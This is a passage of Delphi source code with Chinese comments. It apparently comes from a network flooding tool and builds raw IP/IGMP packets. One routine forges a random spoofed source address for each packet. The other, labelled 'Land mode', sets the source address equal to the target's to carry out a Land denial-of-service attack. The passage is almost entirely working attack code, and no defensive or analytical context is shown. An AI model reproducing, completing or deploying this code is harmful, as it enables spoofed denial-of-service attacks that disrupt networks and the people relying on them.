  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//随机信息重建IGMP头
procedure BuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  IGMPHeader: T_IGMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header) + IGMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_IGMP; //协议类型
  IPHeader.ip_checksum := 0; //校验和

//随机产生源地址
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化IGMP头
  IGMPHeader.igmp_type := 0;
  IGMPHeader.igmp_code := 25;
  IGMPHeader.igmp_checksum := 0;
  IGMPHeader.group := 0;

//第三部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header)], IGMP_PACKET, 'X');
  IGMPHeader.igmp_checksum := CheckSum(Buf, iTotalSize);

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));

end;

//(2)Land模式重建IGMP头
procedure LandBuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

var
  IPHeader: T_IP_Header;
  IGMPHeader: T_IGMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header) + IGMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_IGMP; //协议类型
  IPHeader.ip_checksum := 0; //校验和
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化IGMP头
  IGMPHeader.igmp_type := 0;
  IGMPHeader.igmp_code := 25;
  IGMPHeader.igmp_checksum := 0;
  IGMPHeader.group := 0;

//第三部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header)], IGMP_PACKET, 'X');
  IGMPHeader.igmp_checksum := CheckSum(Buf, iTotalSize);

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @IGMPHeader, SizeOf(T_IGMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_IGMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));

end;


end.

